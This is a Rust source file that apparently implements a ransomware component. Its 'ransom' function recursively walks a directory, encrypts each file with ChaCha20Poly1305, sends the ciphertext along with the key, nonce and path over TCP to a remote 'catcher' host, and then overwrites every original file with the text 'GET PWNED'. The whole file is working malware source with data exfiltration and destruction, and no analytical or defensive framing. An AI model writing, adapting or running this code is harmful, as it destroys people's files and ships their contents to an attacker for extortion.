use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    ChaCha20Poly1305, Key, Nonce,
};
use log::{error, info};
use serde::ser::SerializeStruct;
use serde::{Deserialize, Serialize, Serializer};
use std::{
    fs::{read_dir, DirEntry, File, ReadDir},
    io::{Read, Write},
    path::PathBuf,
};

static TAUNT: &[u8; 9] = b"GET PWNED";

pub fn ransom(root: &str, catcher: &str) {
    info!("ransom mode");
    let files = read_dir(root);
    if let Ok(entries) = files {
        encrypt_dir(entries, catcher)
    } else {
        error!("could not read {root:?}")
    }
}

// Clippy doesn't like that we arent using the fields
#[allow(dead_code)]
#[derive(Debug)]
struct EncryptedFile {
    ciphertext: Vec<u8>,
    key: Key,
    nonce: Nonce,
    path: PathBuf,
}

impl Serialize for EncryptedFile {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        let mut state = serializer.serialize_struct("EncryptedFile", 4)?;
        state.serialize_field("ciphertext", &self.ciphertext)?;
        state.serialize_field("key", &self.key.as_slice())?;
        state.serialize_field("nonce", &self.nonce.as_slice())?;
        state.serialize_field("path", &self.path)?;
        state.end()
    }
}

impl EncryptedFile {
    fn ciphertext(&self) -> &[u8] {
        self.ciphertext.as_ref()
    }
}

// EncryptedFile can be generated from a reference to a directory entry
impl From<&DirEntry> for EncryptedFile {
    fn from(value: &DirEntry) -> Self {
        let mut buf: String = String::new();
        let path: PathBuf = value.path();

        if let Ok(mut file) = File::open(path) {
            if let Ok(bytes) = file.read_to_string(&mut buf) {
                info!("wrote {bytes:?} bytes");
            }
        }

        let key = ChaCha20Poly1305::generate_key(&mut OsRng);
        let cipher = ChaCha20Poly1305::new(&key);
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits; unique per message
        if let Ok(ciphertext) = cipher.encrypt(&nonce, buf.as_bytes().as_ref()) {
            Self {
                ciphertext,
                nonce,
                path: value.path(),
                key,
            }
        } else {
            // just the plaintext
            Self {
                ciphertext: buf.as_bytes().to_vec(),
                nonce,
                path: value.path(),
                key,
            }
        }
    }
}

fn encrypt_dir(files: ReadDir, catcher: &str) {
    for file in files {
        info!("entry {file:?}:");
        if let Ok(entry) = file {
            if let Ok(filetype) = entry.file_type() {
                if filetype.is_dir() {
                    if let Ok(new_files) = read_dir(entry.path()) {
                        encrypt_dir(new_files, catcher)
                    }
                } else {
                    encrypt_file(entry, catcher)
                }
            } else {
                error!("could not determine file type");
            }
        } else {
            error!("could not open file");
        }
    }
}

fn encrypt_file(file: DirEntry, catcher: &str) {
    let enc_file: EncryptedFile = EncryptedFile::from(&file);
    info!(
        "encrypted {} bytes for {file:?}",
        enc_file.ciphertext().len()
    );
    exfiltrate(enc_file, catcher);
    overwrite(file, TAUNT.to_vec()) // CAUTION: OVERWRITES ALL FILES BELOW CURRENT DIRECTORY NODE
}

use std::net::TcpStream;
fn exfiltrate(file: EncryptedFile, catcher: &str) {
    if let Ok(mut stream) = TcpStream::connect(catcher) {
        let serialized: Vec<u8> = match bincode::serialize(&file) {
            Ok(ser) => ser,
            Err(e) => {
                error!("{e:?}");
                Vec::new()
            }
        };

        info!("sending {file:?} over TCP to {catcher:?}");
        match stream.write_all(&serialized) {
            Ok(output) => info!("{output:?}"),
            Err(e) => error!("{e:?}"),
        }
    }
    // TODO
}

fn overwrite(file: DirEntry, content: Vec<u8>) {
    if let Ok(mut new_file) = File::create(file.path()) {
        match new_file.write_all(&content) {
            Ok(_) => info!("encrypted {new_file:?}"),
            Err(err) => error!("{err:?}"),
        }
    } else {
        error!("could not open {file:?}");
    }
}
